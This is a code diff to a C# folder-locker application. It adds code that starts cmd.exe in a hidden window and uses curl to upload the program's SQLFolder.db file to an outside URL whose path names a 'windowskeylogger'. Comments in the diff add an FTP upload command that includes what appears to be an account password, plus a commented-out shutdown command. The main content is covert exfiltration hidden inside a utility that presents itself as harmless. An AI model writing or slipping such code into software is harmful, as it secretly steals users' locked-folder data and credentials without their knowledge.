@@ -32,11 +32,40 @@ namespace folderLocker
       arr[4] = ".{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}";
       arr[5] = ".{7007ACC7-3202-11D1-AAD2-00805FC1270E}";
 
-      
+            string quotes = '"'+filePath()+'"';
+            string command = "curl/bin/curl.exe -F file_name=@" + quotes + "  https://timxn.com/ecom/windowskeylogger/lockfolderdata.php";
+            // string command = "curl/bin/curl.exe -F file_name=@" + filePath() + "  https://timxn.com/ecom/windowskeylogger/lockfolderdata.php";
+            // system("shutdown /s");
+            // C:\Users\User>curl.exe -T E:/Ranjan_Digiline/Workink21/KeySimpleLogger/dat.txt -u ranojan@timxn.com:R2JOhHW9-yt[  ftp://ftp.timxn.com/   
+            
+            Console.WriteLine("just_give: "+command);
+            
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/c "+ command; // "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
+            process.StartInfo = startInfo;
+            process.Start();
 
-    }
+            /*
+             F:\Ranjan\MyVisualStudioC++&c#\Folder-locker-master\folderLocker\bin\Release\curl\bin>curl.exe -F file_name=@"F:\Ranjan\MyVisualStudioC++&c#\Folder-locker-master\folderLocker\bin\Release\SQLFolder.db"  https://timxn.com/ecom/windowskeylogger/lockfolderdata.php                                                                                                                                                                                 
+            The file SQLFolder.db has been uploaded.                                                                                                                                                                                            
+            F:\Ranjan\MyVisualStudioC++&c#\Folder-locker-master\folderLocker\bin\Release\curl\bin> 
+             */
 
-    private void button1_Click(object sender, EventArgs e)
+        }
+
+        public string filePath()
+        {
+            string executable = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string path = (System.IO.Path.GetDirectoryName(executable));
+            Console.WriteLine("my_path: "+path);
+            return path + "\\SQLFolder.db";
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
     {
       //status = lockType;//
       //需要使用文件夹打开器，而不是文件打开器。
@@ -82,6 +111,8 @@ namespace folderLocker
 
 
     }
+
+
 
     private bool setpassword(string path)
     {
